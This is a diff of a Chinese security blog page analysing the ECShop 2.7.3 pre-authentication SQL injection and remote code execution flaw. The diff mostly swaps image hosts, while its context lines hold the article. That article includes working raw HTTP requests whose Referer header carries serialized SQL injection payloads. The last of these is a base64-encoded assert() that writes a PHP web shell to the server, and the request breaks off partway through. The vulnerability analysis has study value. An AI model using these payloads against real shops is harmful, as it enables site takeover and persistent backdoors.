@@ -7,44 +7,44 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="description" content="ECshop 漏洞分析0x01 前言&amp;emsp;&amp;emsp;这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。">
-<meta name="keywords" content="漏洞复现,php,rce,sqli">
+<meta name="keywords" content="php,rce,sqli,漏洞复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ECShop sqli and rce">
 <meta property="og:url" content="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/index.html">
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="ECshop 漏洞分析0x01 前言&amp;emsp;&amp;emsp;这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/xc5u7.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/g0yts.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/pg7gj.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/5xdeu.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/i1ok9.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/zm4nv.jpg">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/dtlu1.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/pg7gj.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/vgiul.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/qx64c.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/nr5en.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/unb33.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/dstq7.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/unb33.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/ntzyn.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/61s1f.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/vgiul.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/c31pb.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/9wmi1.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/sk8i8.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/ncmy5.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/wy90v.jpg">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/mncg9.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/tcp7f.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/4mnmk.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/0i01f.png">
-<meta property="og:updated_time" content="2019-03-13T09:15:02.742Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/xc5u7.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/g0yts.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/pg7gj.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/5xdeu.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/i1ok9.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/zm4nv.jpg">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/dtlu1.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/pg7gj.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/vgiul.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/qx64c.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/nr5en.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/unb33.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/dstq7.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/unb33.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/ntzyn.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/61s1f.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/vgiul.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/c31pb.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/9wmi1.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/sk8i8.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/ncmy5.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/wy90v.jpg">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/mncg9.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/tcp7f.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/4mnmk.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/0i01f.png">
+<meta property="og:updated_time" content="2019-04-10T04:40:04.241Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECShop sqli and rce">
 <meta name="twitter:description" content="ECshop 漏洞分析0x01 前言&amp;emsp;&amp;emsp;这两天出来一个ECshop的全版本RCE漏洞。先感慨一下，自己怎么这么菜，当时审计的时候没发现。最近事情又多，又开始懒了，所以这里补一下这个坑。">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/xc5u7.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/xc5u7.png">
     
     
         
@@ -177,45 +177,45 @@
 <li>php</li>
 </ul>
 <h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>&emsp;&emsp;漏洞的触发点在于ECShop系统的 <strong>user.php</strong> 文件中， <strong>display</strong> 函数的参数可控，可以配合注入可达到远程代码执行的效果。由于是可以不登陆的前台RCE，所以这个漏洞危害还是很高的感觉，利用成本感觉也相当的低。所以分析的时候分两部分，第一部分是SQL注入分析，第二部分是RCE分析。</p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>&emsp;&emsp;首先漏洞的触发点在 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段里，我们截取部分相关代码看一下。 <strong>第8行</strong> 中的 <strong>$back_act</strong> 变量从 <strong>server</strong> 数组中的 <strong>Referer</strong> 字段获取数据，众所周知， <strong>Referer</strong> 字段是可控的。然后代码中的 <strong>第20行</strong> 以 <strong>assign</strong> 方法处理 <strong>$back_act</strong> 变量的值。<strong>第21行</strong> 以 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/xc5u7.png" alt="1"></p>
-<p>&emsp;&emsp;跟进一下 <strong>assign</strong> 方法，这个函数位置在 <strong>/includes/cls_template.php</strong> 文件中，我们截取部分相关代码，从代码中来看 <strong>assign</strong> 方法的作用是把可控变量传递给模版函数。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/g0yts.png" alt="2"></p>
-<p>&emsp;&emsp;我们继续跟进一下 <strong>display</strong> 方法，该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这里的 <strong>display</strong> 方法的作用应该是将模版内容展现在页面上。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/pg7gj.png" alt="3"></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>&emsp;&emsp;首先漏洞的触发点在 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段里，我们截取部分相关代码看一下。 <strong>第8行</strong> 中的 <strong>$back_act</strong> 变量从 <strong>server</strong> 数组中的 <strong>Referer</strong> 字段获取数据，众所周知， <strong>Referer</strong> 字段是可控的。然后代码中的 <strong>第20行</strong> 以 <strong>assign</strong> 方法处理 <strong>$back_act</strong> 变量的值。<strong>第21行</strong> 以 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。<br><img src="http://l1nk3r.xmutsec.com/blog/xc5u7.png" alt="1"></p>
+<p>&emsp;&emsp;跟进一下 <strong>assign</strong> 方法，这个函数位置在 <strong>/includes/cls_template.php</strong> 文件中，我们截取部分相关代码，从代码中来看 <strong>assign</strong> 方法的作用是把可控变量传递给模版函数。<br><img src="http://l1nk3r.xmutsec.com/blog/g0yts.png" alt="2"></p>
+<p>&emsp;&emsp;我们继续跟进一下 <strong>display</strong> 方法，该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这里的 <strong>display</strong> 方法的作用应该是将模版内容展现在页面上。<br><img src="http://l1nk3r.xmutsec.com/blog/pg7gj.png" alt="3"></p>
 <p>&emsp;&emsp;而我们刚刚 <strong>user.php</strong> 中的代码是这样的。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;所以这里 <strong>display</strong> 方法的使用就是读取 <strong>user_passport.dwt</strong> 文件的内容，然后解析变量展示为 <strong>html</strong> ，并且在 <strong>第18行</strong> 中交由 <strong>_echash</strong> 进行分割处理，得到的 <strong>$k</strong> 变量的值交由 <strong>insert_mod</strong> 方法进行处理。这里实际上 <strong>insert_mod</strong> 方法中的 <strong>$val</strong> 是可控的。我们跟进一下 <strong>insert_mod</strong> 方法。<br>&emsp;&emsp;该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这个 <strong>insert_mod</strong> 方法在 <strong>第三行</strong> 以<code>|</code>字符分割传入的内容， <strong>第四行</strong> 反序列化传输入的 <strong>$para</strong> ，然后 <strong>第五行</strong> 通过字符串拼接的方式动态调用函数，最后在 <strong>第7行</strong> 返回调用函数处理 <strong>$para</strong> 变量的结果。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/5xdeu.png" alt="4"></p>
-<p>&emsp;&emsp;所以这里 <strong>insert_mod</strong> 方法里的函数与参数均可以被控制，我们知道注入点在 <strong>/includes/lib_insert.php</strong> 中的 <strong>insert_ads</strong> 方法，我们看一下相关代码。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/i1ok9.png" alt="5"></p>
-<p>&emsp;&emsp;这里很明显 <strong>第21行</strong> 和 <strong>第22行</strong> 的 <strong>$arr[‘id’]</strong> 和 <strong>\$arr[‘num’]</strong> 存在SQL注入。我们来验证一下漏洞。我们看一下正常的登陆过程中的序列化字符串<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/zm4nv.jpg" alt="6"></p>
+<p>&emsp;&emsp;所以这里 <strong>display</strong> 方法的使用就是读取 <strong>user_passport.dwt</strong> 文件的内容，然后解析变量展示为 <strong>html</strong> ，并且在 <strong>第18行</strong> 中交由 <strong>_echash</strong> 进行分割处理，得到的 <strong>$k</strong> 变量的值交由 <strong>insert_mod</strong> 方法进行处理。这里实际上 <strong>insert_mod</strong> 方法中的 <strong>$val</strong> 是可控的。我们跟进一下 <strong>insert_mod</strong> 方法。<br>&emsp;&emsp;该方法出现在 <strong>/includes/cls_template.php</strong> 文件中，截取部分相关代码。这个 <strong>insert_mod</strong> 方法在 <strong>第三行</strong> 以<code>|</code>字符分割传入的内容， <strong>第四行</strong> 反序列化传输入的 <strong>$para</strong> ，然后 <strong>第五行</strong> 通过字符串拼接的方式动态调用函数，最后在 <strong>第7行</strong> 返回调用函数处理 <strong>$para</strong> 变量的结果。<br><img src="http://l1nk3r.xmutsec.com/blog/5xdeu.png" alt="4"></p>
+<p>&emsp;&emsp;所以这里 <strong>insert_mod</strong> 方法里的函数与参数均可以被控制，我们知道注入点在 <strong>/includes/lib_insert.php</strong> 中的 <strong>insert_ads</strong> 方法，我们看一下相关代码。<br><img src="http://l1nk3r.xmutsec.com/blog/i1ok9.png" alt="5"></p>
+<p>&emsp;&emsp;这里很明显 <strong>第21行</strong> 和 <strong>第22行</strong> 的 <strong>$arr[‘id’]</strong> 和 <strong>\$arr[‘num’]</strong> 存在SQL注入。我们来验证一下漏洞。我们看一下正常的登陆过程中的序列化字符串<br><img src="http://l1nk3r.xmutsec.com/blog/zm4nv.jpg" alt="6"></p>
 <p>&emsp;&emsp;然后我们看看我们的sql注入的payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 192.168.248.134</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/dtlu1.png" alt="7"></p>
-<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>&emsp;&emsp;漏洞触发流程还是通过 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段传递参数，然后通过 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。跟进 <strong>display</strong> 方法，该方法在 <strong>/includes/cls_template.php</strong> 文件中，这次的触发点是在第16行的 <strong>fetch</strong> 方法。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/pg7gj.png" alt="3"></p>
-<p>&emsp;&emsp;跟进 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。这里 <strong>第20行</strong> 的 <strong>_eval</strong> 函数引起了我的主意。跟进一下 <strong>_eval</strong> 函数。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/vgiul.png" alt="8"> </p>
-<p>&emsp;&emsp;<strong>_eval</strong> 函数出现在 <strong>/includes/cls_template.php</strong> 文件，我们看看相关代码， <strong>eval</strong> 函数里的可控，那么就会造成RCE的问题了。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/qx64c.png" alt="9"></p>
-<p>&emsp;&emsp;所以这里需要找一下哪里调用了这个 <strong>fetch</strong> 方法，回过头来，我们想想，我们的SQL注入通过动态函数调用，找到存在注入点 <strong>insert_ads</strong> 的函数。那么我们在找找这个函数，我们发现这个方法也存在 <strong>fetch</strong> 方法的调用，相关代码出现在 <strong>/includes/lib_insert.php</strong> 文件中。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/nr5en.png" alt="10"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/dtlu1.png" alt="7"></p>
+<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>&emsp;&emsp;漏洞触发流程还是通过 <strong>user.php</strong> 文件中的 <strong>Referer</strong> 字段传递参数，然后通过 <strong>display</strong> 方法处理 <strong>user_passport.dwr</strong> 。跟进 <strong>display</strong> 方法，该方法在 <strong>/includes/cls_template.php</strong> 文件中，这次的触发点是在第16行的 <strong>fetch</strong> 方法。<br><img src="http://l1nk3r.xmutsec.com/blog/pg7gj.png" alt="3"></p>
+<p>&emsp;&emsp;跟进 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。这里 <strong>第20行</strong> 的 <strong>_eval</strong> 函数引起了我的主意。跟进一下 <strong>_eval</strong> 函数。<br><img src="http://l1nk3r.xmutsec.com/blog/vgiul.png" alt="8"> </p>
+<p>&emsp;&emsp;<strong>_eval</strong> 函数出现在 <strong>/includes/cls_template.php</strong> 文件，我们看看相关代码， <strong>eval</strong> 函数里的可控，那么就会造成RCE的问题了。<br><img src="http://l1nk3r.xmutsec.com/blog/qx64c.png" alt="9"></p>
+<p>&emsp;&emsp;所以这里需要找一下哪里调用了这个 <strong>fetch</strong> 方法，回过头来，我们想想，我们的SQL注入通过动态函数调用，找到存在注入点 <strong>insert_ads</strong> 的函数。那么我们在找找这个函数，我们发现这个方法也存在 <strong>fetch</strong> 方法的调用，相关代码出现在 <strong>/includes/lib_insert.php</strong> 文件中。<br><img src="http://l1nk3r.xmutsec.com/blog/nr5en.png" alt="10"></p>
 <p>&emsp;&emsp;我们看到 <strong>第7行</strong> 有这样一样代码，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;跟进一下 <strong>$position_style</strong> ，该变量的取值过程也在 <strong>/includes/lib_insert.php</strong> 文件中写好了。该 <strong>$position_style</strong> 变量是从数据库中获取数据，假设这个字段可控，那么就会有RCE问题产生了。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/unb33.png" alt="11"></p>
-<p>&emsp;&emsp;这里我们就需要配合刚刚说的SQL注入漏洞。我们知道注入点有两处，一个是 <strong>$arr[‘id’]</strong> ，另一个是 <strong>$[‘num’]</strong> 。 <strong>$arr[‘id’]</strong> 的位置在 <strong>and</strong> 后，可以构造 <strong>union</strong> 联合查询。而 <strong>$[‘num’]</strong> 位置在 <strong>order by</strong> 后面，所以这里可能没办法使用，我们可以截断它。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/dstq7.png" alt="12"></p>
-<p>&emsp;&emsp;这里针对 <strong>$row[‘position_id’]</strong> 做了判断，所以首先我们需要绕过这里判断。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/unb33.png" alt="11"></p>
+<p>&emsp;&emsp;跟进一下 <strong>$position_style</strong> ，该变量的取值过程也在 <strong>/includes/lib_insert.php</strong> 文件中写好了。该 <strong>$position_style</strong> 变量是从数据库中获取数据，假设这个字段可控，那么就会有RCE问题产生了。<br><img src="http://l1nk3r.xmutsec.com/blog/unb33.png" alt="11"></p>
+<p>&emsp;&emsp;这里我们就需要配合刚刚说的SQL注入漏洞。我们知道注入点有两处，一个是 <strong>$arr[‘id’]</strong> ，另一个是 <strong>$[‘num’]</strong> 。 <strong>$arr[‘id’]</strong> 的位置在 <strong>and</strong> 后，可以构造 <strong>union</strong> 联合查询。而 <strong>$[‘num’]</strong> 位置在 <strong>order by</strong> 后面，所以这里可能没办法使用，我们可以截断它。<br><img src="http://l1nk3r.xmutsec.com/blog/dstq7.png" alt="12"></p>
+<p>&emsp;&emsp;这里针对 <strong>$row[‘position_id’]</strong> 做了判断，所以首先我们需要绕过这里判断。<br><img src="http://l1nk3r.xmutsec.com/blog/unb33.png" alt="11"></p>
 <p>&emsp;&emsp;这里我们可以在id处传入<code>&#39;/*</code>这里的作用就是闭合前面的单引号，然后配合num的值注释掉<code>ORDER BY rnd LIMIT</code>。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:47:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/ntzyn.png" alt="14"></p>
-<p>&emsp;&emsp;在数据库里运行之后<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/61s1f.png" alt="13"></p>
-<p>&emsp;&emsp;这里我们前面分析过，我们可控的字段是 <strong>$row[position_style]</strong> ，因此这里需要将payload的位置填写在 <strong>$row[position_style]</strong> 。<br>&emsp;&emsp;这里我们在回过头来看看 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。主要是查看是否有做一些过滤。我们看到 <strong>第20行</strong> 调用 <strong>fetch_str</strong> 函数处理传入的数据，跟进 <strong>fetch_str</strong> 函数。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/vgiul.png" alt="8"></p>
-<p>&emsp;&emsp;该函数出现在 <strong>/includes/cls_template.php</strong> 文件中，截取相关代码，关键代码在 <strong>第13行</strong> 。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/c31pb.png" alt="15"></p>
-<p>&emsp;&emsp;这个函数处理之后最终会return回一个数据，而这部代码主要的作用是假如<code>$source=xxxx{$asd}xxx</code>,那么经过这行代码处理后就是返回<code>this-&gt;select(&#39;\$asd&#39;)</code>的值。<br>&emsp;&emsp;这里继续跟进一下 <strong>select</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。我们看到 <strong>第21行</strong> ，出现<code>$</code>的时候，会调用 <strong>get_val</strong> 函数进行处理。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/9wmi1.png" alt="16"></p>
-<p>&emsp;&emsp;跟进 <strong>get_val</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。代码 <strong>第14行</strong> 当我们的 <strong>\$val</strong> 参数没有<code>.$</code>会在 <strong>第26行</strong> 调用 <strong>make_var</strong> 函数进行处理。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/sk8i8.png" alt="17"></p>
-<p>&emsp;&emsp;跟进一下 <strong>make_var</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。这里我们的 <strong>$val</strong> 变量最后处理的结果实际上是个字符串。<br><img src="http://po8p59xe5.bkt.clouddn.com/blog/ncmy5.png" alt="18"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/ntzyn.png" alt="14"></p>
+<p>&emsp;&emsp;在数据库里运行之后<br><img src="http://l1nk3r.xmutsec.com/blog/61s1f.png" alt="13"></p>
+<p>&emsp;&emsp;这里我们前面分析过，我们可控的字段是 <strong>$row[position_style]</strong> ，因此这里需要将payload的位置填写在 <strong>$row[position_style]</strong> 。<br>&emsp;&emsp;这里我们在回过头来看看 <strong>fetch</strong> 方法，相关代码 <strong>/includes/cls_template.php</strong> 文件。主要是查看是否有做一些过滤。我们看到 <strong>第20行</strong> 调用 <strong>fetch_str</strong> 函数处理传入的数据，跟进 <strong>fetch_str</strong> 函数。<br><img src="http://l1nk3r.xmutsec.com/blog/vgiul.png" alt="8"></p>
+<p>&emsp;&emsp;该函数出现在 <strong>/includes/cls_template.php</strong> 文件中，截取相关代码，关键代码在 <strong>第13行</strong> 。<br><img src="http://l1nk3r.xmutsec.com/blog/c31pb.png" alt="15"></p>
+<p>&emsp;&emsp;这个函数处理之后最终会return回一个数据，而这部代码主要的作用是假如<code>$source=xxxx{$asd}xxx</code>,那么经过这行代码处理后就是返回<code>this-&gt;select(&#39;\$asd&#39;)</code>的值。<br>&emsp;&emsp;这里继续跟进一下 <strong>select</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。我们看到 <strong>第21行</strong> ，出现<code>$</code>的时候，会调用 <strong>get_val</strong> 函数进行处理。<br><img src="http://l1nk3r.xmutsec.com/blog/9wmi1.png" alt="16"></p>
+<p>&emsp;&emsp;跟进 <strong>get_val</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。代码 <strong>第14行</strong> 当我们的 <strong>\$val</strong> 参数没有<code>.$</code>会在 <strong>第26行</strong> 调用 <strong>make_var</strong> 函数进行处理。<br><img src="http://l1nk3r.xmutsec.com/blog/sk8i8.png" alt="17"></p>
+<p>&emsp;&emsp;跟进一下 <strong>make_var</strong> 函数，该函数位置也在 <strong>/includes/cls_template.php</strong> 文件中。这里我们的 <strong>$val</strong> 变量最后处理的结果实际上是个字符串。<br><img src="http://l1nk3r.xmutsec.com/blog/ncmy5.png" alt="18"></p>
 <p>&emsp;&emsp;所以这里我们下个断点看看。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:70:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x617b246c316e6b33727d61,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/wy90v.jpg" alt="19"></p>
-<p>&emsp;&emsp;这里的<code>0x617b246c316e6b33727d61</code>对应的值是<code>a{$l1nk3r}a</code><br><img src="http://po8p59xe5.bkt.clouddn.com/blog/mncg9.png" alt="20"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/wy90v.jpg" alt="19"></p>
+<p>&emsp;&emsp;这里的<code>0x617b246c316e6b33727d61</code>对应的值是<code>a{$l1nk3r}a</code><br><img src="http://l1nk3r.xmutsec.com/blog/mncg9.png" alt="20"></p>
 <p>&emsp;&emsp;因此这里实际上，我们需要闭合这个单引号和反括号，逃逸出来然后执行我们想执行的东西。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$l1nk3r<span class="string">'];assert(base64_decode('</span>ZmlsZV9wdXRfY29udGVudHMoJ2wxbmszci5waHAnLCc8P3BocCBldmFsKCRfUE9TVFtsMW5rM3JdKTsgPz4nKQ==<span class="string">'));//&#125;xxx</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ECShop_V2.7.3/upload/user.php HTTP/1.1</span><br><span class="line">Host: 172.16.244.129</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=smvoo8f5vtgjdtjiva5t0sbec3; ECS_ID=8eea8943e36b6f122bee4ae508742f4e99f354f2; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:310:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246c316e6b3372275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a327778626d737a636935776148416e4c4363385033426f6343426c646d46734b43526655453954564674734d5735724d334a644b547367507a346e4b513d3d2729293b2f2f7d787878,10-- 